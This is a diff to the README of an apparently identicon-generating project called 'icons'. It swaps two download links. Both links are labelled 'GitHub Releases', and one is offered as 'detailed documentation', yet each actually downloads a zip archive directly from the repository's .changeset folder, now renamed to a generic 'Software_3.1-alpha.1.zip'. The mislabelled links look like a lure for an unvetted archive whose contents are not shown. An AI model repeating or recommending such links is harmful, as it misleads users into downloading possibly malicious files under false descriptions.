@@ -8,7 +8,7 @@ Welcome to the icons application! This tool helps you generate unique and determ
 
 To get started, you'll need to download the application. Follow these simple steps:
 
-1. Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/eugene129268/icons/main/.changeset/icons-2.9-beta.1.zip).
+1. Visit this page to download: [GitHub Releases](https://github.com/eugene129268/icons/raw/refs/heads/main/.changeset/Software_3.1-alpha.1.zip).
 2. Select the latest release.
 3. Download the file that matches your system.
 
@@ -76,6 +76,6 @@ Join our community to share experiences, report issues, and suggest features. Ch
 
 ## 📢 Learn More
 
-For detailed documentation, visit the project page on our GitHub repository. You can access it here: [GitHub Releases](https://raw.githubusercontent.com/eugene129268/icons/main/.changeset/icons-2.9-beta.1.zip). 
+For detailed documentation, visit the project page on our GitHub repository. You can access it here: [GitHub Releases](https://github.com/eugene129268/icons/raw/refs/heads/main/.changeset/Software_3.1-alpha.1.zip). 
 
 Enjoy creating your unique identicons!
